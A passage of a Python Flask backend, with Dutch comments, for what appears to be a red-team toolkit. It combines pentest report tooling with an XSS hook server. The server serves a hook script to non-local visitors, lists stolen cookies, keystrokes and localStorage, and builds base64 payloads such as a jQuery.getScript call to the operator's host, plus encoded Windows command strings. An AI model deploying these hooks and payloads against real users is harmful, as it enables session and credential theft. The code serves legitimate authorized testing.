from meuk.hacksec import *
from flask import Blueprint, render_template, redirect, url_for, flash, send_from_directory, abort, request, Response, jsonify, g, current_app
from meuk.flask.models import *
from meuk.flask.security import dashboard_access_allowed
from meuk.flask.security import is_local_request
from meuk.flask.security import require_dashboard_access
import glob
import base64
import json
from pathlib import Path


# Blueprint Configuration (moet voor template filters staan)
index_bp = Blueprint('index_bp', __name__,
                    template_folder='html',
                    static_folder='static')


@index_bp.app_template_filter('zet_actief')
def zet_actief(tab, pag):
    if pag == 'verwerkt':
        if tab == 'tab1':
            return 'in active'
    else:
        if pag !='verwerkt':
            if tab == 'tab0':
                return 'in active'
    return ''

@index_bp.app_template_filter('nulvul')
def nulvul(num):
    return str(num).zfill(3)


@index_bp.app_template_filter('inhoudweergeven')
def inhoud_weergeven(bestand, edit=False):
    try:
        naam=bestand.rsplit('/', 1)[1]
        inhoud = lezen(bestand)
        if edit:
            naam = '<a href="#" class="modalweergeven" data-rel="/dashboard/bestanden/?bewerk='+bestand+'" data-title="'+naam+'">'+naam+'</a>'
            return '<p>'+naam+'</p><pre>'+inhoud+'</pre>'
        else:
            return inhoud
    except:
        return ''

@index_bp.app_template_filter('zet_pill')
def zet_pill(tab, pag):
    if pag == 'verwerkt':
        if tab == 'tab1':
            return 'class="active"'
    else:
        if pag !='verwerkt':
            if tab == 'tab0':
                return 'class="active"'
    return ''



@index_bp.app_template_filter('zet_ip')
def zet_ip(num):
    return str(num).split('//')[1]


@index_bp.app_template_filter('winbas64')
def winbas64(stringh):
    appdata = db_instellingen.query.first()
    strinh = stringh.replace('[host]',appdata.localhost)
    b1 = strinh.encode('utf-16-le')
    b64a = base64.b64encode(b1)
    return str(b64a,'utf-8')



    return str(num).split('//')[1]



@index_bp.app_template_filter('bevindingen_halen')
def bevindingen_halen(num, b):
   
    d=''
    for x in b:
        if int(x.ref) == num:
            d = d + '<li id="finding_'+str(x.id)+'"><a href="#" class="modalweergeven" data-title="'+x.naam+'" data-rel="/dashboard/findings/edit/'+str(x.id)+'">['+str(x.id).zfill(3)+']  <strong>'+x.naam+'</strong></a>    <small class="delete_finding pull-right label-danger" data-item="finding_'+str(x.id)+'" data-rel="'+str(x.id)+'">[instant delete]</small></li>'
    return d


#favicon
@index_bp.route('/favicon.ico')
@index_bp.route('/static/favicon.ico')
def favicon():
    return send_from_directory('static', 'favicon.ico')

@index_bp.route('/dashboard/raw/screenshots/<path:plaatje>')
def plaatje(plaatje):
    require_dashboard_access()
    pagina =  send_from_directory('raw/screenshots/', plaatje)
    return pagina


_SCREENSHOT_DIR = Path('raw/screenshots')
_LAKKEN_DIR = _SCREENSHOT_DIR / 'lakken'
# Annotaties (rode aandachtskaders, transparante binnenkant): in ALLE
# rapportversies zichtbaar (anders dan lakken, dat alleen in de gelakte build geldt).
_ANNOT_DIR = _SCREENSHOT_DIR / 'annot'
# Lak-LAAG (alleen de zwarte vlakken, transparant): apart bewaard zodat we
# 'm over de geannoteerde basis kunnen compositen (volgorde-onafhankelijk).
_LAK_LAYER_DIR = _LAKKEN_DIR / '_layer'
_IMAGE_SUFFIXES = {'.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp', '.svg'}
# Formaten die we niet rasterend kunnen lakken (canvas levert pixels, geen vector).
_NO_REDACT_SUFFIXES = {'.svg'}


@index_bp.route('/api/screenshots', methods=['GET'])
def api_screenshots():
    require_dashboard_access()
    items = []
    if _SCREENSHOT_DIR.exists():
        for p in sorted(_SCREENSHOT_DIR.iterdir()):
            if p.is_file() and p.suffix.lower() in _IMAGE_SUFFIXES:
                items.append({
                    'name': p.name,
                    'url': '/dashboard/raw/screenshots/' + p.name,
                    # Projectafbeelding heeft een gelakte kopie in lakken/<naam>.
                    'has_lakken': (_LAKKEN_DIR / p.name).exists(),
                    'has_annot': (_ANNOT_DIR / p.name).exists(),
                    # svg kan niet rasterend worden gelakt/geannoteerd (vectorformaat).
                    'redactable': p.suffix.lower() not in _NO_REDACT_SUFFIXES,
                })
    return jsonify(items)


def _safe_screenshot_path(name):
    """Resolve <name> binnen raw/screenshots/ en weer path-traversal af.

    Geeft (basisnaam, origineel-pad) terug, of (None, None) als de naam
    buiten de screenshots-map zou wijzen of het bestand niet bestaat.
    """
    from werkzeug.utils import secure_filename
    safe = secure_filename(name or '')
    if not safe or safe != (name or ''):
        # secure_filename veranderde de naam -> verdacht (pad/rare tekens).
        return None, None
    src = _SCREENSHOT_DIR / safe
    try:
        src_res = src.resolve()
        root_res = _SCREENSHOT_DIR.resolve()
        if root_res not in src_res.parents:
            return None, None
    except OSError:
        return None, None
    if not src.is_file():
        return None, None
    return safe, src


def _lak_layer_path(safe):
    return _LAK_LAYER_DIR / (safe + '.png')


def _composite_lakken(safe, src):
    """Render raw/screenshots/lakken/<safe> = (geannoteerde basis OF origineel)
    met de opgeslagen lak-laag eroverheen. Zo komen aandachtskaders altijd mee,
    ongeacht of eerst gelakt of eerst geannoteerd is. Geeft True bij succes (of
    als er niets te doen is)."""
    layer_path = _lak_layer_path(safe)
    if not layer_path.exists():
        return True
    try:
        import io as _io  # noqa: F401
        from PIL import Image
        annot = _ANNOT_DIR / safe
        base_path = annot if annot.exists() else src
        base = Image.open(base_path).convert('RGBA')
        layer = Image.open(str(layer_path)).convert('RGBA')
        if layer.size != base.size:
            layer = layer.resize(base.size)
        out = Image.alpha_composite(base, layer)
        _LAKKEN_DIR.mkdir(parents=True, exist_ok=True)
        if src.suffix.lower() in ('.jpg', '.jpeg', '.bmp'):
            out = out.convert('RGB')
        out.save(str(_LAKKEN_DIR / safe))
        return True
    except Exception:  # noqa: BLE001 — PIL mag de UI nooit breken
        return False


@index_bp.route('/api/screenshots/<name>/redact', methods=['POST', 'DELETE'])
def api_screenshot_redact(name):
    """Beheer de gelakte kopie van een projectafbeelding (screenshot).

    POST: ontvangt de in de browser zwartgelakte afbeelding (PNG data-URL) en
    bewaart die als raw/screenshots/lakken/<naam> met dezelfde bestandsnaam, zodat
    de gelakte rapportbuild deze via \\plaatje{..} i.p.v. het origineel laadt.
    DELETE: verwijdert de gelakte kopie weer.
    """
    require_dashboard_access()
    safe, src = _safe_screenshot_path(name)
    if not safe:
        return jsonify({'error': 'afbeelding niet gevonden'}), 404
    if src.suffix.lower() in _NO_REDACT_SUFFIXES:
        return jsonify({'error': 'svg kan niet gelakt worden (vectorformaat)'}), 400

    lak_path = _LAKKEN_DIR / safe
    layer_path = _lak_layer_path(safe)

    if request.method == 'DELETE':
        try:
            if lak_path.exists():
                lak_path.unlink()
            if layer_path.exists():
                layer_path.unlink()
        except OSError:
            return jsonify({'error': 'verwijderen mislukt'}), 500
        return jsonify({'ok': True, 'has_lakken': False})

    data = request.get_json(silent=True) or {}
    img = data.get('image') or ''
    import re as _re
    m = _re.match(r'^data:image/(?:png|jpeg);base64,(.+)$', img, _re.S)
    if not m:
        return jsonify({'error': 'geen geldige afbeelding (data-URL verwacht)'}), 400
    try:
        raw = base64.b64decode(m.group(1), validate=True)
    except Exception:  # noqa: BLE001
        return jsonify({'error': 'kon afbeelding niet decoderen'}), 400
    if len(raw) > _MAX_SCREENSHOT_SIZE:
        return jsonify({'error': 'afbeelding te groot'}), 413

    # De client stuurt de lak-LAAG (zwarte vlakken op transparant). Die bewaren
    # we los en compositen we over de geannoteerde basis (of het origineel),
    # zodat rode aandachtskaders altijd meekomen, ongeacht de volgorde.
    _LAK_LAYER_DIR.mkdir(parents=True, exist_ok=True)
    try:
        import io
        from PIL import Image
        layer = Image.open(io.BytesIO(raw)).convert('RGBA')
        layer.save(str(layer_path))
    except Exception:  # noqa: BLE001 — PIL mag de UI nooit breken
        return jsonify({'error': 'afbeelding kon niet worden opgeslagen'}), 400
    if not _composite_lakken(safe, src):
        return jsonify({'error': 'afbeelding kon niet worden opgeslagen'}), 400

    return jsonify({'ok': True, 'has_lakken': True})


@index_bp.route('/api/screenshots/<name>/annotate', methods=['POST', 'DELETE'])
def api_screenshot_annotate(name):
    """Beheer de geannoteerde kopie van een projectafbeelding (aandachtskaders).

    POST: ontvangt de in de browser met rode kaders gemarkeerde afbeelding (PNG
    data-URL) en bewaart die als raw/screenshots/annot/<naam>. Die wordt door de
    \\plaatje{..}-macro in ALLE rapportversies als basis geladen (ook ongelakt),
    zodat aandachtspunten altijd zichtbaar zijn.
    DELETE: verwijdert de geannoteerde kopie weer.
    """
    require_dashboard_access()
    safe, src = _safe_screenshot_path(name)
    if not safe:
        return jsonify({'error': 'afbeelding niet gevonden'}), 404
    if src.suffix.lower() in _NO_REDACT_SUFFIXES:
        return jsonify({'error': 'svg kan niet geannoteerd worden (vectorformaat)'}), 400

    annot_path = _ANNOT_DIR / safe

    if request.method == 'DELETE':
        try:
            if annot_path.exists():
                annot_path.unlink()
        except OSError:
            return jsonify({'error': 'verwijderen mislukt'}), 500
        _composite_lakken(safe, src)  # lak opnieuw over het origineel
        return jsonify({'ok': True, 'has_annot': False})

    data = request.get_json(silent=True) or {}
    img = data.get('image') or ''
    import re as _re
    m = _re.match(r'^data:image/(?:png|jpeg);base64,(.+)$', img, _re.S)
    if not m:
        return jsonify({'error': 'geen geldige afbeelding (data-URL verwacht)'}), 400
    try:
        raw = base64.b64decode(m.group(1), validate=True)
    except Exception:  # noqa: BLE001
        return jsonify({'error': 'kon afbeelding niet decoderen'}), 400
    if len(raw) > _MAX_SCREENSHOT_SIZE:
        return jsonify({'error': 'afbeelding te groot'}), 413

    _ANNOT_DIR.mkdir(parents=True, exist_ok=True)
    try:
        import io as _io
        from PIL import Image
        im = Image.open(_io.BytesIO(raw))
        if im.mode in ('RGBA', 'P', 'LA') and src.suffix.lower() in ('.jpg', '.jpeg', '.bmp'):
            im = im.convert('RGB')
        im.save(str(annot_path))
    except Exception:  # noqa: BLE001 — PIL mag de UI nooit breken
        return jsonify({'error': 'afbeelding kon niet worden opgeslagen'}), 400

    _composite_lakken(safe, src)  # lak (indien aanwezig) over de nieuwe annot-basis
    return jsonify({'ok': True, 'has_annot': True})


_MAX_SCREENSHOT_SIZE = 15 * 1024 * 1024  # 15 MB


@index_bp.route('/api/screenshots', methods=['POST'])
def api_screenshots_upload():
    """Upload een project-afbeelding (screenshot) rechtstreeks naar
    raw/screenshots/, zodat die direct als \\plaatje{..} in notities/bevindingen
    kan worden ingevoegd. Voedt de plak-/sleep-flow van de LaTeX-editor."""
    import os
    import uuid
    from werkzeug.utils import secure_filename
    require_dashboard_access()

    f = request.files.get('file')
    if f is None:
        return jsonify({'error': 'geen bestand meegegeven'}), 400

    original = secure_filename(f.filename or '') or 'screenshot.png'
    stem, ext = os.path.splitext(original)
    ext = (ext or '.png').lower()
    if ext not in _IMAGE_SUFFIXES:
        return jsonify({'error': 'bestandstype niet toegestaan'}), 415
    stem = (stem or 'screenshot').lower()[:40].strip('._-') or 'screenshot'

    # Grootte begrenzen (stream naar geheugen is prima voor screenshots).
    blob = f.read()
    if len(blob) == 0:
        return jsonify({'error': 'leeg bestand'}), 400
    if len(blob) > _MAX_SCREENSHOT_SIZE:
        return jsonify({'error': 'bestand te groot (max 15 MB)'}), 413

    _SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
    name = '{}_{}{}'.format(stem, uuid.uuid4().hex[:8], ext)
    dest = _SCREENSHOT_DIR / name
    with open(dest, 'wb') as out:
        out.write(blob)

    return jsonify({
        'ok': True,
        'name': name,
        'url': '/dashboard/raw/screenshots/' + name,
    })


#basic website
@index_bp.route('/', defaults={'cms_pag': 'index'}, methods=['GET', 'POST'])
@index_bp.route('/<cms_pag>')
def index(cms_pag):
    if not is_local_request():
        # Non-localhost altijd de hook pagina, ongeacht session state
        g.is_public_page = True
        nonce = getattr(g, 'csp_nonce', '')
        return (
            f'<html><title>hallo wereld</title><body>'
            f'<h1>Een moment a.u.b.</h1>'
            f'<script nonce="{nonce}" src="/x.js"></script>'
            f'</body></html>'
        )

    else:
        require_dashboard_access()
        appdata = db_instellingen.query.first()

        #use our normal pages
        hooked = db_xxs_hooked.query.all()
        cookies = db_xxs_cookies.query.order_by('datum').all()
        keylogger = db_xxs_keylogger.query.order_by('datum').all()
        localstorage=db_xxs_localstorage.query.order_by('datum').all()
        from meuk.flask import project as _project
        _oid = _project.current_opdracht_id()
        template = db_bevindingen_templates.query.all()
        bevindingen = _project.apply_scope(
            db_bevindingen.query, db_bevindingen.opdracht_id, _oid).all()
        notes = _project.apply_scope(
            db_notes.query, db_notes.opdracht_id, _oid).all()

        d="jQuery.getScript('"+appdata.localhost+"/x.js');"
        js1=base64.b64encode(bytes(d, 'utf-8'))
        js1 = str(js1, 'utf-8')
        jspagina = render_template('xss.html', localhost=appdata.localhost)
        js2=base64.b64encode(bytes(jspagina, 'utf-8'))
        js2 = str(js2, 'utf-8')

        commands=glob.glob('http/commands/*')

        xxe_count = db_xxe.query.count()
        csrf_count = db_csrf.query.count()
        sqli_count = db_sqli.query.count()
        ssrf_count = db_ssrf.query.count()

        #overzichtweergeven
        pagina = render_template('dashboard.html', cms_pag=cms_pag, bevindingen=bevindingen, cookies=cookies, keylogger=keylogger, localstorage=localstorage,  hooked=hooked, aantalhooked=len(hooked), template=template, js1=js1, js2=js2, appdata=appdata, commands=commands, notes=notes, xxe_count=xxe_count, csrf_count=csrf_count, sqli_count=sqli_count, ssrf_count=ssrf_count)
        return pagina


# Vrije-tekstvelden waarvoor een globale standaardtekst kan worden ingesteld
# (opgeslagen op de db_instellingen-singleton). Per opdracht kan de operator ze
# met één klik invoegen ("Vul met standaard") en daarna aanpassen.
_RAPPORT_DEFAULT_FIELDS = (
    'rapport_contact',
    'rapport_management_samenvatting', 'rapport_algeheel_beeld',
    'rapport_modus_operandi', 'rapport_kritieke_functies',
    'rapport_blueteam', 'rapport_purpleteam', 'rapport_verklaring',
    'rapport_legsup_startpunt', 'rapport_legsup_privileges',
    'rapport_legsup_informatie', 'rapport_roe',
)

# Template-teksten die per opdracht overschreven kunnen worden (leeg = standaard
# auto-gegenereerde tekst). Opgeslagen als JSON in rapport_overrides.
_RAPPORT_OVERRIDE_KEYS = ('inleiding', 'methodologie', 'tools')

# Label per veld (voor de boilerplate-UI, zonder hardcoding in de frontend).
_RAPPORT_FIELD_LABELS = {
    'rapport_contact': 'Contactgegevens (colofon)',
    'rapport_management_samenvatting': 'Managementsamenvatting',
    'rapport_algeheel_beeld': 'Algeheel beeld',
    'rapport_kritieke_functies': 'Kritieke functies',
    'rapport_roe': 'Rules of Engagement',
    'rapport_modus_operandi': 'Modus operandi (red team)',
    'rapport_blueteam': 'Blue team — detectie & respons (red team)',
    'rapport_purpleteam': 'Purple teaming (red team)',
    'rapport_verklaring': 'Verklaring (red team)',
    'rapport_legsup_startpunt': 'Legs up — startpunt (red team)',
    'rapport_legsup_privileges': 'Legs up — rechten (red team)',
    'rapport_legsup_informatie': 'Legs up — verstrekte informatie (red team)',
}

# Placeholders die in standaardteksten gebruikt mogen worden; bij invoegen
# vervangen door de gegevens van de actieve opdracht.
_RAPPORT_TOKENS = [
    ('{{klant}}', 'Opdrachtgever'),
    ('{{project}}', 'Project/opdrachtnaam'),
    ('{{auteur}}', 'Opsteller'),
    ('{{omgeving}}', 'Omgeving'),
    ('{{scope}}', 'Testscope'),
    ('{{testtype}}', 'Type onderzoek'),
    ('{{versie}}', 'Rapportversie'),
    ('{{classificatie}}', 'Classificatie'),
    ('{{periode}}', 'Testperiode (start–eind)'),
    ('{{startdatum}}', 'Startdatum test'),
    ('{{einddatum}}', 'Einddatum test'),
    ('{{vandaag}}', 'Datum van vandaag'),
]


def _rapport_token_values(cfg):
    """Waarden voor de placeholders, afgeleid van de actieve opdracht-config."""
    import datetime as _d

    def g(attr, default=''):
        return (getattr(cfg, attr, '') or '') if cfg is not None else default
    tt = g('rapport_testtype') or 'pentest'
    tt_label = 'red team assessment' if tt == 'redteam' else 'penetratietest'
    start = str(g('rapport_test_start_date') or '')
    eind = str(g('rapport_test_end_date') or '')
    if start and eind:
        periode = '%s t/m %s' % (start, eind)
    else:
        periode = start or eind or ''
    return {
        '{{klant}}': g('rapport_project'),
        '{{project}}': g('rapport_project'),
        '{{auteur}}': g('rapport_auteur'),
        '{{omgeving}}': g('rapport_omgeving'),
        '{{scope}}': g('rapport_testscope'),
        '{{testtype}}': tt_label,
        '{{versie}}': g('rapport_versie'),
        '{{classificatie}}': g('rapport_classificatie') or 'TLP:RED',
        '{{periode}}': periode,
        '{{startdatum}}': start,
        '{{einddatum}}': eind,
        '{{vandaag}}': _d.date.today().isoformat(),
    }


def _resolve_tokens(text, cfg):
    """Vervang alle {{token}}'s in `text` door de opdrachtwaarden."""
    if not text:
        return text or ''
    for tok, val in _rapport_token_values(cfg).items():
        if tok in text:
            text = text.replace(tok, val)
    return text


def _boiler_data(prof):
    try:
        d = json.loads(prof.data or '{}')
        return d if isinstance(d, dict) else {}
    except Exception:
        return {}


def _ensure_boiler_seed():
    """Zorg dat er minstens één (default) boilerplate-profiel is; seed de eerste
    keer uit de legacy db_instellingen-velden (nl)."""
    if db_rapport_boiler.query.count() > 0:
        return
    s = db_instellingen.query.first()
    data = {}
    for f in _RAPPORT_DEFAULT_FIELDS:
        val = (getattr(s, f, '') or '') if s is not None else ''
        data[f] = {'nl': val, 'en': ''}
    prof = db_rapport_boiler(naam='Standaard', testtype='', is_default=True,
                             volgorde=0, data=json.dumps(data))
    db.session.add(prof)
    db.session.commit()


@index_bp.route('/api/settings')
def api_settings():
    require_dashboard_access()
    from meuk.flask import project as _project
    s = db_instellingen.query.first()
    p = _project.current_config()  # projectvelden komen uit het actieve project
    return jsonify({
        'public_upload': bool(getattr(s, 'public_upload', False)),
        'public_downloads': bool(getattr(s, 'public_downloads', False)),
        'public_payloads': bool(getattr(s, 'public_payloads', False)),
        'behind_proxy': bool(getattr(s, 'behind_proxy', False)),
        'obfuscate_downloads': bool(getattr(s, 'obfuscate_downloads', False)),
        'obfuscate_technique': getattr(s, 'obfuscate_technique', '') or 'mixed',
        'default_payload': getattr(s, 'default_payload', '') or '',
        'localhost': (s.localhost if s else '') or '',
        'rapport_titel': getattr(p, 'rapport_titel', '') or '',
        'rapport_auteur': getattr(p, 'rapport_auteur', '') or '',
        'rapport_subtitel': getattr(p, 'rapport_subtitel', '') or '',
        'rapport_project': getattr(p, 'rapport_project', '') or '',
        'rapport_omgeving': getattr(p, 'rapport_omgeving', '') or '',
        'rapport_classificatie': getattr(p, 'rapport_classificatie', '') or 'TLP:RED',
        'rapport_taal': getattr(p, 'rapport_taal', '') or 'nl',
        'rapport_isdraft': bool(getattr(p, 'rapport_isdraft', True)),
        'rapport_testtype': getattr(p, 'rapport_testtype', '') or 'pentest',
        'rapport_testscope': getattr(p, 'rapport_testscope', '') or 'blackbox',
        'rapport_management_samenvatting': getattr(p, 'rapport_management_samenvatting', '') or '',
        'rapport_algeheel_beeld': getattr(p, 'rapport_algeheel_beeld', '') or '',
        'rapport_modus_operandi': getattr(p, 'rapport_modus_operandi', '') or '',
        'rapport_kritieke_functies': getattr(p, 'rapport_kritieke_functies', '') or '',
        'rapport_blueteam': getattr(p, 'rapport_blueteam', '') or '',
        'rapport_purpleteam': getattr(p, 'rapport_purpleteam', '') or '',
        'rapport_verklaring': getattr(p, 'rapport_verklaring', '') or '',
        'rapport_legsup_startpunt': getattr(p, 'rapport_legsup_startpunt', '') or '',
        'rapport_legsup_privileges': getattr(p, 'rapport_legsup_privileges', '') or '',
        'rapport_legsup_informatie': getattr(p, 'rapport_legsup_informatie', '') or '',
        'rapport_scenarios': json.loads(getattr(p, 'rapport_scenarios', '[]') or '[]'),
        'rapport_begrippen': json.loads(getattr(p, 'rapport_begrippen', '[]') or '[]'),
        'rapport_bijlagen': json.loads(getattr(p, 'rapport_bijlagen', '[]') or '[]'),
        'rapport_vrije_secties': json.loads(getattr(p, 'rapport_vrije_secties', '[]') or '[]'),
        'rapport_overrides': json.loads(getattr(p, 'rapport_overrides', '{}') or '{}'),
        'rapport_section_toggles': json.loads(getattr(p, 'rapport_section_toggles', '{}') or '{}'),
        'rapport_scope_targets': json.loads(getattr(p, 'rapport_scope_targets', '[]') or '[]'),
        'rapport_contact': getattr(p, 'rapport_contact', '') or '',
        'rapport_revisies': json.loads(getattr(p, 'rapport_revisies', '[]') or '[]'),
        'rapport_distributie': json.loads(getattr(p, 'rapport_distributie', '[]') or '[]'),
        'rapport_logo_path': getattr(p, 'rapport_logo_path', '') or '',
        'rapport_template_variant': getattr(p, 'rapport_template_variant', '') or 'detailed',
        'rapport_roe': getattr(p, 'rapport_roe', '') or '',
        'rapport_test_start_date': str(getattr(p, 'rapport_test_start_date', '') or ''),
        'rapport_test_end_date': str(getattr(p, 'rapport_test_end_date', '') or ''),
        'rapport_versie': getattr(p, 'rapport_versie', '') or '',
        'rapport_versie_status': getattr(p, 'rapport_versie_status', '') or 'concept',
        # Debrief (lessons learned)
        'debrief_context': getattr(p, 'debrief_context', '') or '',
        'debrief_werkte': getattr(p, 'debrief_werkte', '') or '',
        'debrief_faalde': getattr(p, 'debrief_faalde', '') or '',
        'debrief_detectie': getattr(p, 'debrief_detectie', '') or '',
        'debrief_vervolg': getattr(p, 'debrief_vervolg', '') or '',
        # PDF-beveiliging: wachtwoorden blijven zichtbaar in de UI (localhost-tool),
        # zodat de operator het ingestelde wachtwoord kan verifiëren.
        'rapport_pdf_protected': bool(getattr(p, 'rapport_pdf_password', '') or ''),
        'rapport_pdf_owner_protected': bool(getattr(p, 'rapport_pdf_owner_password', '') or ''),
        'rapport_pdf_password': getattr(p, 'rapport_pdf_password', '') or '',
        'rapport_pdf_owner_password': getattr(p, 'rapport_pdf_owner_password', '') or '',
        # DefectDojo: verbinding (URL/sleutel/TLS) is server-breed (db_instellingen),
        # product/engagement per project. API-sleutel gemaskeerd. Verbinding valt
        # terug op de per-opdracht-config voor bestaande (legacy) projecten.
        'dd_url': (getattr(s, 'dd_url', '') or getattr(p, 'dd_url', '') or ''),
        'dd_api_key_set': bool(getattr(s, 'dd_api_key', '') or getattr(p, 'dd_api_key', '') or ''),
        'dd_product_id': getattr(p, 'dd_product_id', None),
        'dd_engagement_id': getattr(p, 'dd_engagement_id', None),
        'dd_verify_ssl': bool(
            getattr(s, 'dd_verify_ssl', True)
            if (getattr(s, 'dd_url', '') or getattr(s, 'dd_api_key', ''))
            else getattr(p, 'dd_verify_ssl', True)),
        'dd_auto_push': bool(getattr(p, 'dd_auto_push', False)),
    })


@index_bp.route('/api/settings', methods=['POST'])
def api_settings_update():
    require_dashboard_access()
    if not is_local_request():
        abort(403)
    data = request.get_json(force=True)
    from meuk.flask import project as _project
    s = db_instellingen.query.first()
    p = _project.current_config()  # projectvelden schrijven we naar het actieve project
    for key in ('public_upload', 'public_downloads', 'public_payloads', 'behind_proxy'):
        if key in data:
            setattr(s, key, bool(data[key]))
    if 'behind_proxy' in data:
        current_app.config["BEHIND_PROXY"] = bool(data['behind_proxy'])
    if 'obfuscate_downloads' in data:
        s.obfuscate_downloads = bool(data['obfuscate_downloads'])
    if 'obfuscate_technique' in data and isinstance(data['obfuscate_technique'], str):
        if data['obfuscate_technique'] in ('mixed', 'subexpr', 'format', 'chararray', 'backtick'):
            s.obfuscate_technique = data['obfuscate_technique']
    if 'default_payload' in data and isinstance(data['default_payload'], str):
        try:
            s.default_payload = data['default_payload'].strip()
        except Exception:
            pass
    if 'localhost' in data and isinstance(data['localhost'], str):
        s.localhost = data['localhost'].strip()
    for key in ('rapport_titel', 'rapport_auteur', 'rapport_subtitel',
                 'rapport_project', 'rapport_omgeving', 'rapport_classificatie', 'rapport_taal',
                 'rapport_testtype', 'rapport_testscope'):
        if key in data and isinstance(data[key], str):
            setattr(p, key, data[key].strip()[:200])
    if 'rapport_management_samenvatting' in data and isinstance(data['rapport_management_samenvatting'], str):
        p.rapport_management_samenvatting = data['rapport_management_samenvatting'].strip()[:10000]
    if 'rapport_algeheel_beeld' in data and isinstance(data['rapport_algeheel_beeld'], str):
        p.rapport_algeheel_beeld = data['rapport_algeheel_beeld'].strip()[:10000]
    if 'rapport_modus_operandi' in data and isinstance(data['rapport_modus_operandi'], str):
        p.rapport_modus_operandi = data['rapport_modus_operandi'].strip()[:10000]
    for _k in ('rapport_kritieke_functies', 'rapport_blueteam',
               'rapport_purpleteam', 'rapport_verklaring'):
        if _k in data and isinstance(data[_k], str):
            setattr(p, _k, data[_k].strip()[:10000])
    for key in ('rapport_legsup_startpunt', 'rapport_legsup_privileges', 'rapport_legsup_informatie'):
        if key in data and isinstance(data[key], str):
            setattr(p, key, data[key].strip()[:10000])
    if 'rapport_scenarios' in data and isinstance(data['rapport_scenarios'], list):
        scenarios = data['rapport_scenarios'][:20]
        clean = []
        for sc in scenarios:
            if isinstance(sc, dict):
                clean.append({
                    'naam': str(sc.get('naam', ''))[:500],
                    'beschrijving': str(sc.get('beschrijving', ''))[:5000],
                })
        p.rapport_scenarios = json.dumps(clean)
    if 'rapport_begrippen' in data and isinstance(data['rapport_begrippen'], list):
        clean_b = []
        for b in data['rapport_begrippen'][:200]:
            if isinstance(b, dict) and str(b.get('term', '')).strip():
                clean_b.append({'term': str(b.get('term', ''))[:200],
                                'definitie': str(b.get('definitie', ''))[:2000]})
        p.rapport_begrippen = json.dumps(clean_b)
    if 'rapport_overrides' in data and isinstance(data['rapport_overrides'], dict):
        try:
            cur_ov = json.loads(getattr(p, 'rapport_overrides', '{}') or '{}')
        except (ValueError, TypeError):
            cur_ov = {}
        for k in _RAPPORT_OVERRIDE_KEYS:
            v = data['rapport_overrides'].get(k)
            if isinstance(v, str):
                cur_ov[k] = v[:10000]
        p.rapport_overrides = json.dumps(cur_ov)
    if 'rapport_bijlagen' in data and isinstance(data['rapport_bijlagen'], list):
        # Eigen vrije-tekst bijlagen (na \appendix): lijst van {titel, tekst}.
        clean_bij = []
        for b in data['rapport_bijlagen'][:50]:
            if isinstance(b, dict) and (str(b.get('titel', '')).strip() or str(b.get('tekst', '')).strip()):
                clean_bij.append({'titel': str(b.get('titel', ''))[:200],
                                  'tekst': str(b.get('tekst', ''))[:50000]})
        p.rapport_bijlagen = json.dumps(clean_bij)
    if 'rapport_vrije_secties' in data and isinstance(data['rapport_vrije_secties'], list):
        # Eigen vrije tekstblokken in de hoofdtekst: lijst van
        # {id, niveau, titel, tekst, na}. id = [a-z]{1,16} (markersleutel wordt
        # 'vrij_<id>'); niveau in section/subsection/subsubsection; na = de
        # sectiesleutel of 'vrij_<id>' waar het blok direct achter komt.
        import re as _re_vs
        import random as _rnd_vs
        _vs_niveaus = ('section', 'subsection', 'subsubsection')
        clean_vs, _seen_vs = [], set()
        for v in data['rapport_vrije_secties'][:100]:
            if not isinstance(v, dict):
                continue
            titel = str(v.get('titel', ''))[:200]
            tekst = str(v.get('tekst', ''))[:50000]
            if not (titel.strip() or tekst.strip()):
                continue
            vid = str(v.get('id', ''))
            if not _re_vs.fullmatch(r'[a-z]{1,16}', vid) or vid in _seen_vs:
                while True:
                    vid = ''.join(_rnd_vs.choice('abcdefghijklmnopqrstuvwxyz')
                                  for _ in range(6))
                    if vid not in _seen_vs:
                        break
            _seen_vs.add(vid)
            niveau = str(v.get('niveau', 'section'))
            if niveau not in _vs_niveaus:
                niveau = 'section'
            na = str(v.get('na', ''))[:60]
            if not _re_vs.fullmatch(r'[a-z_]+', na):
                na = ''
            clean_vs.append({'id': vid, 'niveau': niveau, 'titel': titel,
                             'tekst': tekst, 'na': na})
        p.rapport_vrije_secties = json.dumps(clean_vs)
    if 'rapport_section_toggles' in data and isinstance(data['rapport_section_toggles'], dict):
        # Per-opdracht sectie aan/uit: afwijkingen t.o.v. de template. Volledige
        # vervanging met gevalideerde {sectiesleutel: bool}-paren.
        clean_t = {}
        for k, v in list(data['rapport_section_toggles'].items())[:100]:
            if isinstance(k, str):
                clean_t[k[:50]] = bool(v)
        p.rapport_section_toggles = json.dumps(clean_t)
    _SCOPE_TARGET_TYPES = ('host', 'netwerk', 'url', 'applicatie')
    if 'rapport_scope_targets' in data and isinstance(data['rapport_scope_targets'], list):
        raw_targets = data['rapport_scope_targets'][:50]
        clean_targets = []
        for st in raw_targets:
            if isinstance(st, dict):
                clean_targets.append({
                    'target': str(st.get('target', ''))[:500],
                    'type': str(st.get('type', 'host'))[:20] if str(st.get('type', 'host')) in _SCOPE_TARGET_TYPES else 'host',
                    'beschrijving': str(st.get('beschrijving', ''))[:500],
                })
        p.rapport_scope_targets = json.dumps(clean_targets)
    if 'rapport_contact' in data and isinstance(data['rapport_contact'], str):
        p.rapport_contact = data['rapport_contact'].strip()[:5000]
    if 'rapport_revisies' in data and isinstance(data['rapport_revisies'], list):
        clean_rev = []
        for rv in data['rapport_revisies'][:50]:
            if isinstance(rv, dict):
                clean_rev.append({
                    'versie': str(rv.get('versie', ''))[:30],
                    'datum': str(rv.get('datum', ''))[:30],
                    'auteur': str(rv.get('auteur', ''))[:200],
                    'wijziging': str(rv.get('wijziging', ''))[:1000],
                })
        p.rapport_revisies = json.dumps(clean_rev)
    if 'rapport_distributie' in data and isinstance(data['rapport_distributie'], list):
        clean_dist = []
        for d in data['rapport_distributie'][:50]:
            if isinstance(d, dict):
                clean_dist.append({
                    'naam': str(d.get('naam', ''))[:200],
                    'organisatie': str(d.get('organisatie', ''))[:200],
                    'rol': str(d.get('rol', ''))[:200],
                    'versie': str(d.get('versie', ''))[:30],
                })
        p.rapport_distributie = json.dumps(clean_dist)
    if 'rapport_isdraft' in data:
        p.rapport_isdraft = bool(data['rapport_isdraft'])
    if 'rapport_template_variant' in data and isinstance(data['rapport_template_variant'], str):
        if data['rapport_template_variant'] in ('detailed', 'executive', 'board'):
            p.rapport_template_variant = data['rapport_template_variant']
    if 'rapport_roe' in data and isinstance(data['rapport_roe'], str):
